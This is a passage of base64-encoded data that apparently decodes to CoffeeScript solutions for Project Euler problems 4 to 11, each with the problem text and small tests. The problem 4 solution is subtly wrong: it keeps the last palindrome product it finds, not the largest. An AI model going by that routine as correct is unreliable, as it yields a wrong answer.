je3Z9KSByZXR1cm5zIGZhbHNlXCIpXG5cbnByb2JsZW0uYW5zd2VyID0gLT5cbiAgbGFyZ2VzdGkgPSAwXG4gIGxhcmdlc3RqID0gMFxuICBsYXJnZXN0cCA9IDBcblxuICBmb3IgaSBpbiBbMTAwLi45OTldXG4gICAgZm9yIGogaW4gWzEwMC4uOTk5XVxuICAgICAgcHJvZHVjdCA9IGkgKiBqXG4gICAgICBpZiBpc1BhbGluZHJvbWUocHJvZHVjdClcbiAgICAgICAgbGFyZ2VzdGkgPSBpXG4gICAgICAgIGxhcmdlc3RqID0galxuICAgICAgICBsYXJnZXN0cCA9IHByb2R1Y3RcblxuICByZXR1cm4gbGFyZ2VzdHBcbiIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDU6IFNtYWxsZXN0IG11bHRpcGxlXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbjI1MjAgaXMgdGhlIHNtYWxsZXN0IG51bWJlciB0aGF0IGNhbiBiZSBkaXZpZGVkIGJ5IGVhY2ggb2YgdGhlIG51bWJlcnMgZnJvbSAxIHRvIDEwIHdpdGhvdXQgYW55IHJlbWFpbmRlci5cblxuV2hhdCBpcyB0aGUgc21hbGxlc3QgcG9zaXRpdmUgbnVtYmVyIHRoYXQgaXMgZXZlbmx5IGRpdmlzaWJsZSBieSBhbGwgb2YgdGhlIG51bWJlcnMgZnJvbSAxIHRvIDIwP1xuXG5cIlwiXCJcblxucHJvYmxlbS5hbnN3ZXIgPSAtPlxuICBuID0gMFxuICBsb29wXG4gICAgbiArPSAyMCAjIFByb2JhYmx5IGNvdWxkIGJlIHNvbWUgY2xldmVyIHN1bSBvZiBwcmltZXMgYmV0d2VlbiAxLTIwIG9yIHNvbWV0aGluZy4gSSBkb24ndCBjYXJlLlxuICAgIGZvdW5kID0gdHJ1ZVxuICAgIGZvciBpIGluIFsxLi4yMF1cbiAgICAgIGlmIChuICUgaSkgIT0gMFxuICAgICAgICBmb3VuZCA9IGZhbHNlXG4gICAgICAgIGJyZWFrXG5cbiAgICBicmVhayBpZiBmb3VuZFxuXG4gIHJldHVybiBuXG4iLCJtb2R1bGUuZXhwb3J0cyA9IHByb2JsZW0gPSBuZXcgUHJvYmxlbSBcIlwiXCJcblxuUHJvYmxlbSA2OiBTdW0gc3F1YXJlIGRpZmZlcmVuY2Vcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cblRoZSBzdW0gb2YgdGhlIHNxdWFyZXMgb2YgdGhlIGZpcnN0IHRlbiBuYXR1cmFsIG51bWJlcnMgaXMsXG5cbiAgICAgICAgICAgICAxXjIgKyAyXjIgKyAuLi4gKyAxMF4yID0gMzg1XG5cblRoZSBzcXVhcmUgb2YgdGhlIHN1bSBvZiB0aGUgZmlyc3QgdGVuIG5hdHVyYWwgbnVtYmVycyBpcyxcblxuICAgICAgICAgICgxICsgMiArIC4uLiArIDEwKV4yID0gNTVeMiA9IDMwMjVcblxuSGVuY2UgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiB0aGUgc3VtIG9mIHRoZSBzcXVhcmVzIG9mIHRoZSBmaXJzdCB0ZW4gbmF0dXJhbCBudW1iZXJzIGFuZCB0aGUgc3F1YXJlIG9mIHRoZSBzdW0gaXMgMzAyNSDiiJIgMzg1ID0gMjY0MC5cblxuRmluZCB0aGUgZGlmZmVyZW5jZSBiZXR3ZWVuIHRoZSBzdW0gb2YgdGhlIHNxdWFyZXMgb2YgdGhlIGZpcnN0IG9uZSBodW5kcmVkIG5hdHVyYWwgbnVtYmVycyBhbmQgdGhlIHNxdWFyZSBvZiB0aGUgc3VtLlxuXG5cIlwiXCJcblxuc3VtT2ZTcXVhcmVzID0gKG4pIC0+XG4gIHN1bSA9IDBcbiAgZm9yIGkgaW4gWzEuLm5dXG4gICAgc3VtICs9IChpICogaSlcbiAgcmV0dXJuIHN1bVxuXG5zcXVhcmVPZlN1bSA9IChuKSAtPlxuICBzdW0gPSAwXG4gIGZvciBpIGluIFsxLi5uXVxuICAgIHN1bSArPSBpXG4gIHJldHVybiAoc3VtICogc3VtKVxuXG5kaWZmZXJlbmNlU3VtU3F1YXJlcyA9IChuKSAtPlxuICByZXR1cm4gc3F1YXJlT2ZTdW0obikgLSBzdW1PZlNxdWFyZXMobilcblxucHJvYmxlbS50ZXN0ID0gLT5cbiAgZXF1YWwoc3VtT2ZTcXVhcmVzKDEwKSwgMzg1LCBcIlN1bSBvZiBzcXVhcmVzIG9mIGZpcnN0IHRlbiBuYXR1cmFsIG51bWJlcnMgaXMgMzg1XCIpXG4gIGVxdWFsKHNxdWFyZU9mU3VtKDEwKSwgMzAyNSwgXCJTcXVhcmUgb2Ygc3VtIG9mIGZpcnN0IHRlbiBuYXR1cmFsIG51bWJlcnMgaXMgMzAyNVwiKVxuICBlcXVhbChkaWZmZXJlbmNlU3VtU3F1YXJlcygxMCksIDI2NDAsIFwiRGlmZmVyZW5jZSBpbiB2YWx1ZXMgZm9yIHRoZSBmaXJzdCB0ZW4gbmF0dXJhbCBudW1iZXJzIGlzIDI2NDBcIilcblxucHJvYmxlbS5hbnN3ZXIgPSAtPlxuICByZXR1cm4gZGlmZmVyZW5jZVN1bVNxdWFyZXMoMTAwKVxuIiwibW9kdWxlLmV4cG9ydHMgPSBwcm9ibGVtID0gbmV3IFByb2JsZW0gXCJcIlwiXG5cblByb2JsZW0gNzogMTAwMDFzdCBwcmltZVxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbkJ5IGxpc3RpbmcgdGhlIGZpcnN0IHNpeCBwcmltZSBudW1iZXJzOiAyLCAzLCA1LCA3LCAxMSwgYW5kIDEzLCB3ZSBjYW4gc2VlIHRoYXQgdGhlIDZ0aCBwcmltZSBpcyAxMy5cblxuV2hhdCBpcyB0aGUgMTAsMDAxc3QgcHJpbWUgbnVtYmVyP1xuXG5cIlwiXCJcblxubWF0aCA9IHJlcXVpcmUgXCJtYXRoXCJcblxubnRoUHJpbWUgPSAobikgLT5cbiAgc2lldmUgPSBuZXcgbWF0aC5JbmNyZW1lbnRhbFNpZXZlXG4gIGZvciBpIGluIFsxLi4ubl1cbiAgICBzaWV2ZS5uZXh0KClcbiAgcmV0dXJuIHNpZXZlLm5leHQoKVxuXG5wcm9ibGVtLnRlc3QgPSAtPlxuICBlcXVhbChudGhQcmltZSg2KSwgMTMsIFwiNnRoIHByaW1lIGlzIDEzXCIpXG5cbnByb2JsZW0uYW5zd2VyID0gLT5cbiAgcmV0dXJuIG50aFByaW1lKDEwMDAxKVxuIiwibW9kdWxlLmV4cG9ydHMgPSBwcm9ibGVtID0gbmV3IFByb2JsZW0gXCJcIlwiXG5cblByb2JsZW0gODogTGFyZ2VzdCBwcm9kdWN0IGluIGEgc2VyaWVzXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG5UaGUgZm91ciBhZGphY2VudCBkaWdpdHMgaW4gdGhlIDEwMDAtZGlnaXQgbnVtYmVyIHRoYXQgaGF2ZSB0aGUgZ3JlYXRlc3QgcHJvZHVjdCBhcmUgOSB4IDkgeCA4IHggOSA9IDU4MzIuXG5cbiAgNzMxNjcxNzY1MzEzMzA2MjQ5MTkyMjUxMTk2NzQ0MjY1NzQ3NDIzNTUzNDkxOTQ5MzRcbiAgOTY5ODM1MjAzMTI3NzQ1MDYzMjYyMzk1NzgzMTgwMTY5ODQ4MDE4Njk0Nzg4NTE4NDNcbiAgODU4NjE1NjA3ODkxMTI5NDk0OTU0NTk1MDE3Mzc5NTgzMzE5NTI4NTMyMDg4MDU1MTFcbiAgMTI1NDA2OTg3NDcxNTg1MjM4NjMwNTA3MTU2OTMyOTA5NjMyOTUyMjc0NDMwNDM1NTdcbiAgNjY4OTY2NDg5NTA0NDUyNDQ1MjMxNjE3MzE4NTY0MDMwOTg3MTExMjE3MjIzODMxMTNcbiAgNjIyMjk4OTM0MjMzODAzMDgxMzUzMzYyNzY2MTQyODI4MDY0NDQ0ODY2NDUyMzg3NDlcbiAgMzAzNTg5MDcyOTYyOTA0OTE1NjA0NDA3NzIzOTA3MTM4MTA1MTU4NTkzMDc5NjA4NjZcbiAgNzAxNzI0MjcxMjE4ODM5OTg3OTc5MDg3OTIyNzQ5MjE5MDE2OTk3MjA4ODgwOTM3NzZcbiAgNjU3MjczMzMwMDEwNTMzNjc4ODEyMjAyMzU0MjE4MDk3NTEyNTQ1NDA1OTQ3NTIyNDNcbiAgNTI1ODQ5MDc3MTE2NzA1NTYwMTM2MDQ4Mzk1ODY0NDY3MDYzMjQ0MTU3MjIxNTUzOTdcbiAgNTM2OTc4MTc5Nzc4NDYxNzQwNjQ5NTUxNDkyOTA4NjI1NjkzMjE5Nzg0Njg2MjI0ODJcbiAgODM5NzIyNDEzNzU2NTcwNTYwNTc0OTAyNjE0MDc5NzI5Njg2NTI0MTQ1MzUxMDA0NzRcbiAgODIxNjYzNzA0ODQ0MDMxOTk4OTAwMDg4OTUyNDM0NTA2NTg1NDEyMjc1ODg2NjY4ODFcbiAgMTY0MjcxNzE0Nzk5MjQ0NDI5MjgyMzA4NjM0NjU2NzQ4MTM5MTkxMjMxNjI4MjQ1ODZcbiAgMTc4NjY0NTgzNTkxMjQ1NjY1Mjk0NzY1NDU2ODI4NDg5MTI4ODMxNDI2MDc2OTAwNDJcbiAgMjQyMTkwMjI2NzEwNTU2MjYzMjExMTExMDkzNzA1NDQyMTc1MDY5NDE2NTg5NjA0MDhcbiAgMDcxOTg0MDM4NTA5NjI0NTU0NDQzNjI5ODEyMzA5ODc4Nzk5MjcyNDQyODQ5MDkxODhcbiAgODQ1ODAxNTYxNjYwOTc5MTkxMzM4NzU0OTkyMDA1MjQwNjM2ODk5MTI1NjA3MTc2MDZcbiAgMDU4ODYxMTY0NjcxMDk0MDUwNzc1NDEwMDIyNTY5ODMxNTUyMDAwNTU5MzU3Mjk3MjVcbiAgNzE2MzYyNjk1NjE4ODI2NzA0MjgyNTI0ODM2MDA4MjMyNTc1MzA0MjA3NTI5NjM0NTBcblxuRmluZCB0aGUgdGhpcnRlZW4gYWRqYWNlbnQgZGlnaXRzIGluIHRoZSAxMDAwLWRpZ2l0IG51bWJlciB0aGF0IGhhdmUgdGhlIGdyZWF0ZXN0IHByb2R1Y3QuIFdoYXQgaXMgdGhlIHZhbHVlIG9mIHRoaXMgcHJvZHVjdD9cblxuXCJcIlwiXG5cbnN0ciA9IFwiXCJcIlxuICAgICAgNzMxNjcxNzY1MzEzMzA2MjQ5MTkyMjUxMTk2NzQ0MjY1NzQ3NDIzNTUzNDkxOTQ5MzRcbiAgICAgIDk2OTgzNTIwMzEyNzc0NTA2MzI2MjM5NTc4MzE4MDE2OTg0ODAxODY5NDc4ODUxODQzXG4gICAgICA4NTg2MTU2MDc4OTExMjk0OTQ5NTQ1OTUwMTczNzk1ODMzMTk1Mjg1MzIwODgwNTUxMVxuICAgICAgMTI1NDA2OTg3NDcxNTg1MjM4NjMwNTA3MTU2OTMyOTA5NjMyOTUyMjc0NDMwNDM1NTdcbiAgICAgIDY2ODk2NjQ4OTUwNDQ1MjQ0NTIzMTYxNzMxODU2NDAzMDk4NzExMTIxNzIyMzgzMTEzXG4gICAgICA2MjIyOTg5MzQyMzM4MDMwODEzNTMzNjI3NjYxNDI4MjgwNjQ0NDQ4NjY0NTIzODc0OVxuICAgICAgMzAzNTg5MDcyOTYyOTA0OTE1NjA0NDA3NzIzOTA3MTM4MTA1MTU4NTkzMDc5NjA4NjZcbiAgICAgIDcwMTcyNDI3MTIxODgzOTk4Nzk3OTA4NzkyMjc0OTIxOTAxNjk5NzIwODg4MDkzNzc2XG4gICAgICA2NTcyNzMzMzAwMTA1MzM2Nzg4MTIyMDIzNTQyMTgwOTc1MTI1NDU0MDU5NDc1MjI0M1xuICAgICAgNTI1ODQ5MDc3MTE2NzA1NTYwMTM2MDQ4Mzk1ODY0NDY3MDYzMjQ0MTU3MjIxNTUzOTdcbiAgICAgIDUzNjk3ODE3OTc3ODQ2MTc0MDY0OTU1MTQ5MjkwODYyNTY5MzIxOTc4NDY4NjIyNDgyXG4gICAgICA4Mzk3MjI0MTM3NTY1NzA1NjA1NzQ5MDI2MTQwNzk3Mjk2ODY1MjQxNDUzNTEwMDQ3NFxuICAgICAgODIxNjYzNzA0ODQ0MDMxOTk4OTAwMDg4OTUyNDM0NTA2NTg1NDEyMjc1ODg2NjY4ODFcbiAgICAgIDE2NDI3MTcxNDc5OTI0NDQyOTI4MjMwODYzNDY1Njc0ODEzOTE5MTIzMTYyODI0NTg2XG4gICAgICAxNzg2NjQ1ODM1OTEyNDU2NjUyOTQ3NjU0NTY4Mjg0ODkxMjg4MzE0MjYwNzY5MDA0MlxuICAgICAgMjQyMTkwMjI2NzEwNTU2MjYzMjExMTExMDkzNzA1NDQyMTc1MDY5NDE2NTg5NjA0MDhcbiAgICAgIDA3MTk4NDAzODUwOTYyNDU1NDQ0MzYyOTgxMjMwOTg3ODc5OTI3MjQ0Mjg0OTA5MTg4XG4gICAgICA4NDU4MDE1NjE2NjA5NzkxOTEzMzg3NTQ5OTIwMDUyNDA2MzY4OTkxMjU2MDcxNzYwNlxuICAgICAgMDU4ODYxMTY0NjcxMDk0MDUwNzc1NDEwMDIyNTY5ODMxNTUyMDAwNTU5MzU3Mjk3MjVcbiAgICAgIDcxNjM2MjY5NTYxODgyNjcwNDI4MjUyNDgzNjAwODIzMjU3NTMwNDIwNzUyOTYzNDUwXG4gICAgICBcIlwiXCJcbnN0ciA9IHN0ci5yZXBsYWNlKC9bXjAtOV0vZ20sIFwiXCIpXG5kaWdpdHMgPSAocGFyc2VJbnQoZGlnaXQpIGZvciBkaWdpdCBpbiBzdHIpXG5cbmxhcmdlc3RQcm9kdWN0ID0gKGRpZ2l0Q291bnQpIC0+XG4gIHJldHVybiAwIGlmIGRpZ2l0Q291bnQgPiBkaWdpdHMubGVuZ3RoXG5cbiAgbGFyZ2VzdCA9IDBcbiAgZm9yIHN0YXJ0IGluIFswLi4oZGlnaXRzLmxlbmd0aCAtIGRpZ2l0Q291bnQpXVxuICAgIGVuZCA9IHN0YXJ0ICsgZGlnaXRDb3VudFxuICAgIHByb2R1Y3QgPSAxXG4gICAgZm9yIGkgaW4gW3N0YXJ0Li4uZW5kXVxuICAgICAgcHJvZHVjdCAqPSBkaWdpdHNbaV1cbiAgICBpZiBsYXJnZXN0IDwgcHJvZHVjdFxuICAgICAgbGFyZ2VzdCA9IHByb2R1Y3RcblxuICByZXR1cm4gbGFyZ2VzdFxuXG5wcm9ibGVtLnRlc3QgPSAtPlxuICBlcXVhbChsYXJnZXN0UHJvZHVjdCg0KSwgNTgzMiwgIFwiR3JlYXRlc3QgcHJvZHVjdCBvZiA0IGFkamFjZW50IGRpZ2l0cyBpcyA1ODMyXCIpXG4gIGVxdWFsKGxhcmdlc3RQcm9kdWN0KDUpLCA0MDgyNCwgXCJHcmVhdGVzdCBwcm9kdWN0IG9mIDUgYWRqYWNlbnQgZGlnaXRzIGlzIDQwODI0XCIpXG5cbnByb2JsZW0uYW5zd2VyID0gLT5cbiAgcmV0dXJuIGxhcmdlc3RQcm9kdWN0KDEzKVxuIiwibW9kdWxlLmV4cG9ydHMgPSBwcm9ibGVtID0gbmV3IFByb2JsZW0gXCJcIlwiXG5cblByb2JsZW0gOTogU3BlY2lhbCBQeXRoYWdvcmVhbiB0cmlwbGV0XG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG5BIFB5dGhhZ29yZWFuIHRyaXBsZXQgaXMgYSBzZXQgb2YgdGhyZWUgbmF0dXJhbCBudW1iZXJzLCBhIDwgYiA8IGMsIGZvciB3aGljaCxcblxuICAgIGFeMiArIGJeMiA9IGNeMlxuXG5Gb3IgZXhhbXBsZSwgM14yICsgNF4yID0gOSArIDE2ID0gMjUgPSA1XjIuXG5cblRoZXJlIGV4aXN0cyBleGFjdGx5IG9uZSBQeXRoYWdvcmVhbiB0cmlwbGV0IGZvciB3aGljaCBhICsgYiArIGMgPSAxMDAwLlxuXG5GaW5kIHRoZSBwcm9kdWN0IGFiYy5cblxuXCJcIlwiXG5cbmlzVHJpcGxldCA9IChhLCBiLCBjKSAtPlxuICByZXR1cm4gKChhKmEpICsgKGIqYikpID09IChjKmMpXG5cbmZpbmRGaXJzdFRyaXBsZXQgPSAoc3VtKSAtPlxuICBmb3IgYSBpbiBbMS4uLjEwMDBdXG4gICAgZm9yIGIgaW4gWzEuLi4xMDAwXVxuICAgICAgYyA9IDEwMDAgLSBhIC0gYlxuICAgICAgaWYgaXNUcmlwbGV0KGEsIGIsIGMpXG4gICAgICAgIHJldHVybiBbYSwgYiwgY11cblxuICByZXR1cm4gZmFsc2VcblxuXG5wcm9ibGVtLnRlc3QgPSAtPlxuICBlcXVhbChpc1RyaXBsZXQoMywgNCwgNSksIHRydWUsIFwiKDMsNCw1KSBpcyBhIFB5dGhhZ29yZWFuIHRyaXBsZXRcIilcblxucHJvYmxlbS5hbnN3ZXIgPSAtPlxuICByZXR1cm4gZmluZEZpcnN0VHJpcGxldCgxMDAwKVxuIiwibW9kdWxlLmV4cG9ydHMgPSBwcm9ibGVtID0gbmV3IFByb2JsZW0gXCJcIlwiXG5cblByb2JsZW0gMTA6IFN1bW1hdGlvbiBvZiBwcmltZXNcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuVGhlIHN1bSBvZiB0aGUgcHJpbWVzIGJlbG93IDEwIGlzIDIgKyAzICsgNSArIDcgPSAxNy5cblxuRmluZCB0aGUgc3VtIG9mIGFsbCB0aGUgcHJpbWVzIGJlbG93IHR3byBtaWxsaW9uLlxuXG5cIlwiXCJcblxubWF0aCA9IHJlcXVpcmUgXCJtYXRoXCJcblxucHJpbWVTdW0gPSAoY2VpbGluZykgLT5cbiAgc2lldmUgPSBuZXcgbWF0aC5JbmNyZW1lbnRhbFNpZXZlXG5cbiAgc3VtID0gMFxuICBsb29wXG4gICAgbiA9IHNpZXZlLm5leHQoKVxuICAgIGlmIG4gPj0gY2VpbGluZ1xuICAgICAgYnJlYWtcbiAgICBzdW0gKz0gblxuXG4gIHJldHVybiBzdW1cblxucHJvYmxlbS50ZXN0ID0gLT5cbiAgZXF1YWwocHJpbWVTdW0oMTApLCAxNywgXCJTdW0gb2YgcHJpbWVzIGJlbG93IDEwIGlzIDE3XCIpXG5cbnByb2JsZW0uYW5zd2VyID0gLT5cbiAgcmV0dXJuIHByaW1lU3VtKDIwMDAwMDApXG4iLCJtb2R1bGUuZXhwb3J0cyA9IHByb2JsZW0gPSBuZXcgUHJvYmxlbSBcIlwiXCJcblxuUHJvYmxlbSAxMTogTGFyZ2VzdCBwcm9kdWN0IGluIGEgZ3JpZFxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG5JbiB0aGUgMjB4MjAgZ3JpZCBiZWxvdywgZm91ciBudW1iZXJzIGFsb25nIGEgZGlhZ29uYWwgbGluZSBoYXZlIGJlZW4gbWFya2VkIGluIHJlZC5cblxuICAgICAgICAgIDA4IDAyIDIyIDk3IDM4IDE1IDAwIDQwIDAwIDc1IDA0IDA1IDA3IDc4IDUyIDEyIDUwIDc3IDkxIDA4XG4gICAgICAgICAgNDkgNDkgOTkgNDAgMTcgODEgMTggNTcgNjAgODcgMTcgNDAgOTggNDMgNjkgNDggMDQgNTYgNjIgMDBcbiAgICAgICAgICA4MSA0OSAzMSA3MyA1NSA3OSAxNCAyOSA5MyA3MSA0MCA2NyA1MyA4OCAzMCAwMyA0OSAxMyAzNiA2NVxuICAgICAgICAgIDUyIDcwIDk1IDIzIDA0IDYwIDExIDQyIDY5IDI0IDY4IDU2IDAxIDMyIDU2IDcxIDM3IDAyIDM2IDkxXG4gICAgICAgICAgMjIgMzEgMTYgNzEgNTEgNjcgNjMgODkgNDEgOTIgMzYgNTQgMjIgNDAgNDAgMjggNjYgMzMgMTMgODBcbiAgICAgICAgICAyNCA0NyAzMiA2MCA5OSAwMyA0NSAwMiA0NCA3NSAzMyA1MyA3OCAzNiA4NCAyMCAzNSAxNyAxMiA1MFxuICAgICAgICAgIDMyIDk4IDgxIDI4IDY0IDIzIDY3IDEwIDI2XzM4IDQwIDY3IDU5IDU0IDcwIDY2IDE4IDM4IDY0IDcwXG4gICAgICAgICAgNjcgMjYgMjAgNjggMDIgNjIgMTIgMjAgOTUgNjNfOTQgMzkgNjMgMDggNDAgOTEgNjYgNDkgOTQgMjFcbiAgICAgICAgICAyNCA1NSA1OCAwNSA2NiA3MyA5OSAyNiA5NyAxNyA3OF83OCA5NiA4MyAxNCA4OCAzNCA4OSA2MyA3MlxuICAgICAgICAgIDIxIDM2IDIzIDA5IDc1IDAwIDc2IDQ0IDIwIDQ1IDM1IDE0IDAwIDYxIDMzIDk3IDM0IDMxIDMzIDk1XG4gICAgICAgICAgNzggMTcgNTMgMjggMjIgNzUgMzEgNjcgMTUgOTQgMDMgODAgMDQgNjIgMTYgMTQgMDkgNTMgNTYgOTJcbiAgICAgICAgICAxNiAzOSAwNSA0MiA5NiAzNSAzMSA0NyA1NSA1OCA4OCAyNCAwMCAxNyA1NCAyNCAzNiAyOSA4NSA1N1xuICAgICAgICAgIDg2IDU2IDAwIDQ4IDM1IDcxIDg5IDA3IDA1IDQ0IDQ0IDM3IDQ0IDYwIDIxIDU4IDUxIDU0IDE3IDU4XG4gICAgICAgICAgMTkgODAgODEgNjggMDUgOTQgNDcgNjkgMjggNzMgOTIgMTMgODYgNTIgMTcgNzcgMDQgODkgNTUgNDBcbiAgICAgICAgICAwNCA1MiAwOCA4MyA5NyAzNSA5OSAxNiAwNyA5NyA1NyAzMiAxNiAyNiAyNiA3OSAzMyAyNyA5OCA2NlxuICAgICAgICAgIDg4IDM2IDY4IDg3IDU3IDYyIDIwIDcyIDAzIDQ2IDMzIDY3IDQ2IDU1IDEyIDMyIDYzIDkzIDUzIDY5XG4gICAgICAgICAgMDQgNDIgMTYgNzMgMzggMjUgMzkgMTEgMjQgOTQgNzIgMTggMDggNDYgMjkgMzIgNDAgNjIgNzYgMzZcbiAgICAgICAgICAyMCA2OSAzNiA0MSA3MiAzMCAyMyA4OCAzNCA2MiA5OSA2OSA4MiA2NyA1OSA4NSA3NCAwNCAzNiAxNlxuICAgICAgICAgIDIwIDczIDM1IDI5IDc4IDMxIDkwIDAxIDc0IDMxIDQ5IDcxIDQ4IDg2IDgxIDE2IDIzIDU3IDA1IDU0XG4gICAgICAgICAgMDEgNzAgNTQgNzEgODMgNTEgNTQgNjkgMTYgOTIgMzMgNDggNjEgNDMgNTIgMDEgODkgMTkgNjcgNDhcblxuVGhlIHByb2R1Y3Qgb2YgdGhlc2UgbnVtYmVycyBpcyAyNiB4IDYzIHggNzggeCAxNCA9IDE3ODg2OTYuXG5cbldoYXQgaXMgdGhlIGdyZWF0ZXN0IHByb2R1Y3Qgb2YgZm91ciBhZGphY2VudCBudW1iZXJzIGluIHRoZSBzYW1lIGRpcmVjdGlvbiAodXAsIGRvd24sIGxlZnQsIHJpZ2h0LCBvciBkaWFnb25hbGx5KSBpbiB0aGUgMjB4MjAgZ3JpZD9cblxuXCJcIlwiXG5cbmdyaWQgPSBudWxsXG5cbnByZXBhcmVHcmlkID0gLT5cbiAgcmF3RGlnaXRzID0gXCJcIlwiXG4gICAgMDggMDIgMjIgOTcgMzggMTUgMDAgNDAgMDAgNzUgMDQgMDUgMDcgNzggNTIgMTIgNTAgNzcgOTEgMDhcbiAgICA0OSA0OSA5OSA0MCAxNyA4MSAxOCA1NyA2MCA4NyAxNyA0MCA5OCA0MyA2OSA0OCAwNCA1NiA2MiAwMFxuICAgIDgxIDQ5IDMxIDczIDU1IDc5IDE0IDI5IDkzIDcxIDQwIDY3IDUzIDg4IDMwIDAzIDQ5IDEzIDM2IDY1XG4gICAgNTIgNzAgOTUgMjMgMDQgNjAgMTEgNDIgNjkgMjQgNjggNTYgMDEgMzIgNTYgNzEgMzcgMDIgMzYgOTFcbiAgICAyMiAzMSAxNiA3MSA1MSA2NyA2MyA4OSA0MSA5MiAzNiA1NCAyMiA0MCA0MCAyOCA2NiAzMyAxMyA4MFxuICAgIDI0IDQ3IDMyIDYwIDk5IDAzIDQ1IDAyIDQ0IDc1IDMzIDUzIDc4IDM2IDg0IDIwIDM1IDE3IDEyIDUwXG4gICAgMzIgOTggODEgMjggNjQgMjMgNjcgMTAgMjYgMzggNDAgNjcgNTkgNTQgNzAgNjYgMTggMzggNjQgNzBcbiAgICA2NyAyNiAyMCA2OCAwMiA2MiAxMiAyMCA5NSA2MyA5NCAzOSA2MyAwOCA0MCA5MSA2NiA0OSA5NCAyMVxuICAgIDI0IDU1IDU4IDA1IDY2IDczIDk5IDI2IDk3IDE3IDc4IDc4IDk2IDgzIDE0IDg4IDM0IDg5IDYzIDcyXG4gICAgMjEgMzYgMjMgMDkgNzUgMDAgNzYgNDQgMjAgNDUgMzUgMTQgMDAgNjEgMzMgOTcgMzQgMzEgMzMgOTVcbiAgICA3OCAxNyA1MyAyOCAyMiA3NSAzMSA2NyAxNSA5NCAwMyA4MCAwNCA2MiAxNiAxNCAwOSA1MyA1NiA5MlxuICAgIDE2IDM5IDA1IDQyIDk2IDM1IDMxIDQ3IDU1IDU4IDg4IDI0IDAwIDE3IDU0IDI0IDM2IDI5IDg1IDU3XG4gICAgODYgNTYgMDAgNDggMzUgNzEgODkgMDcgMDUgNDQgNDQgMzcgNDQgNjAgMjEgNTggNTEgNTQgMTcgNThcbiAgICAxOSA4MCA4MSA2OCAwNSA5NCA0NyA2OSAyOCA3MyA5MiAxMyA4NiA1MiAxNyA3NyAwNCA4OSA1NSA0MFxuICAgIDA0IDUyIDA4IDgzIDk3IDM1IDk5IDE2IDA3IDk3IDU3IDMyIDE2IDI2IDI2IDc5IDMzIDI3IDk4IDY2XG4gICAgODggMzYgNjggODcgNTcgNjIgMjAgNzIgMDMgNDYgMzMgNjcgNDYgNTUgMTIgMzIgNjMgOTMgNTMgNjlcbiAgICAwNCA0MiAxNiA3MyAzOCAyNSAzOSAxMSAyNCA5NCA3MiAxOCAwOCA0NiAyOSAzMiA0MCA2MiA3NiAzNlxuICAgIDIwIDY5IDM2IDQxIDcyIDMwIDIzIDg4IDM0IDYyIDk5IDY5IDgyIDY3IDU5IDg1IDc0IDA0IDM2IDE2XG4gICAgMjAgNzMgMzUgMjkgNzggMzEgOTAgMDEgNzQgMzEgNDkgNzEgNDggODYgODEgMTYgMjMgNTcgMDUgNTRcbiAgICAwMSA3MCA1NCA3MSA4MyA1MSA1NCA2OSAxNiA5MiAzMyA0OCA2MSA0MyA1MiAwMSA4OSAxOSA2NyA0OFxuICBcIlwiXCIucmVwbGFjZSgvW14wLTkgXS9nbSwgXCIgXCIpXG5cbiAgZGlnaXRzID0gKHBhcnNlSW50KGRpZ2l0KSBmb3IgZGlnaXQgaW4gcmF3RGlnaXRzLnNwbGl0KFwiIFwiKSlcbiAgZ3JpZCA9IEFycmF5KDIwKVxuICBmb3IgaSBpbiBbMC4uLjIwXVxuICAgIGdyaWRbaV0gPSBBcnJheSgyMClcblxuICBpbmRleCA9IDBcbiAgZm9yIGogaW4gWzAuLi4yMF1cbiAgICBmb3IgaSBpbiBbMC4uLjIwXVxuICAgICAgZ3JpZFtpXVtqXSA9IGRpZ2l0c1tpbmRleF1cbiAgICAgIGluZGV4KytcblxucHJlcGFyZUdyaWQoKVxuXG4jIEdldHMgYSBwcm9kdWN0IG9mIDQgdmFsdWVzIHN0YXJ0aW5nIGF0IChzeCwgc3kpLCBoZWFkaW5nIGluIHRoZSBkaXJlY3Rpb24gKGR4LCBkeSlcbiMgUmV0dXJucyAtMSBpZiB0aGVyZSBpcyBubyByb29tIHRvIG1ha2UgYSBzdHJpcGUgb2YgNC5cbmdldExpbmVQcm9kdWN0ID0gKHN4LCBzeSwgZHgsIGR5KSAtPlxuICBleCA9IHN4ICsgKDQgKiBkeClcbiAgcmV0dXJuIC0xIGlmIChleCA8IDApIG9yIChleCA+PSAyMClcbiAgZXkgPSBzeSArICg0ICogZHkpXG4gIHJldHVybiAtMSBpZiAoZXkgPCAwKSBvciAoZXkgPj0gMjApXG5cbiAgeCA9IHN4XG4gIHkgPSBzeVxuICBwcm9kdWN0ID0gMVxuICBmb3IgaSBpbiBbMC4uLjRdXG4gICAgcHJvZHVjdCAqPSBncmlkW3hdW3ldXG4gICAgeCArPSBkeFxuICAgIHkgKz0gZHlcblxuICByZXR1cm4gcHJvZHVjdFxuXG5nZXRMaW5lID0gKHN4LCBzeSwgZHgsIGR5KSAtPlxuICBleCA9IHN4ICsgKDQgKiBkeClcbiAgcmV0dXJuIFtdIGlmIChleCA8IDApIG9yIChleCA+PSAyMClcbiAgZXkgPSBzeSArICg0ICogZHkpXG4gIHJldHVybiBbXSBpZiAoZXkgPCAwKSBvciAoZXkgPj0gMjApXG5cbiAgbGluZSA9IFtdXG5cbiAgeCA9IHN4XG4gIHkgPSBzeVxuICBmb3IgaSBpbiBbMC4uLjRdXG4gICAgbGluZS5wdXNoIGdyaWRbeF1beV1cbiAgICB4ICs9IGR4XG4gICAgeSArPSBkeVxuXG4gIHJldHVybiBsaW5lXG5cbnByb2JsZW0udGVzdCA9IC0+XG4gICMgRXhhbXBsZSBpcyBkaWFnb25hbCByaWdodC9kb3duIGZyb20gKDgsNilcbiAgZXF1YWwoZ2V0TGluZVByb2R1Y3QoOCwgNiwgMSwgMSksIDE3ODg2